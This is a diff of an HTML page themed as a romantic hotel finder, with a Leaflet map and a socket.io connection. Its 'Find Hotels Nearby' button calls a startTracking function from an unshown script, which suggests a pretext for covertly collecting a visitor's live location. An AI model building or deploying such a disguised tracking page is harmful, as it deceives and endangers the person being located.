@@ -1,57 +1,55 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
+
 <head>
-<title>Hotels Nearby</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Romantic Getaway | Find Hotels</title>
 
-<link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css"/>
-
-<style>
-body { margin:0; }
-
-#map { height:100vh; }
-
-.overlay {
-  position:absolute;
-  top:0;
-  left:0;
-  right:0;
-  bottom:0;
-  background:white;
-  display:flex;
-  flex-direction:column;
-  align-items:center;
-  justify-content:center;
-  z-index:2000;
-}
-
-.msg {
-  position:absolute;
-  top:20px;
-  left:50%;
-  transform:translateX(-50%);
-  background:white;
-  padding:10px 20px;
-  border-radius:10px;
-  font-weight:bold;
-  z-index:1000;
-}
-</style>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <link
+    href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@500;700&family=Poppins:wght@300;400;500&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="css/style.css">
 </head>
 
 <body>
 
-<div class="overlay" id="permissionOverlay">
-  <button onclick="startTracking()" style="padding:15px 30px;font-size:18px;">
-    Find Hotels Nearby
-  </button>
-</div>
+  <!-- Floating Hearts Background -->
+  <div class="hearts-container">
+    <div class="heart" style="left: 10%; animation-duration: 7s;"></div>
+    <div class="heart" style="left: 20%; animation-duration: 8s; animation-delay: 2s;"></div>
+    <div class="heart" style="left: 50%; animation-duration: 9s; animation-delay: 4s;"></div>
+    <div class="heart" style="left: 70%; animation-duration: 6s; animation-delay: 1s;"></div>
+    <div class="heart" style="left: 85%; animation-duration: 10s; animation-delay: 3s;"></div>
+  </div>
 
-<div class="msg">Looking for hotels nearby...</div>
-<div id="map"></div>
+  <div class="overlay" id="permissionOverlay">
+    <div class="glass-panel">
+      <h1 class="title" style="font-size: 3rem; margin-bottom: 10px;">Find Your Romantic Getaway</h1>
+      <p style="font-size: 1.1rem; opacity: 0.9; margin-bottom: 30px;">Let us find the perfect spot for you and your
+        loved one.</p>
+      <button id="trackBtn" class="btn-romantic">Find Hotels Nearby</button>
+    </div>
+  </div>
 
-<script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
-<script src="/socket.io/socket.io.js"></script>
-<script src="/js/user.js"></script>
+  <div class="msg">Searching for romantic spots nearby...</div>
+  <div id="map"></div>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script src="/socket.io/socket.io.js"></script>
+  <script src="/js/hotels.js"></script>
+  <script src="/js/user.js"></script>
+
+  <script>
+    document.getElementById("trackBtn").onclick = function () {
+      startTracking();
+      // Optional: hide overlay nicely
+      // document.getElementById('permissionOverlay').style.display = 'none'; 
+      // The user.js likely handles logic, but let's leave it to user.js to be safe or just trigger it.
+    };
+  </script>
 
 </body>
+
 </html>
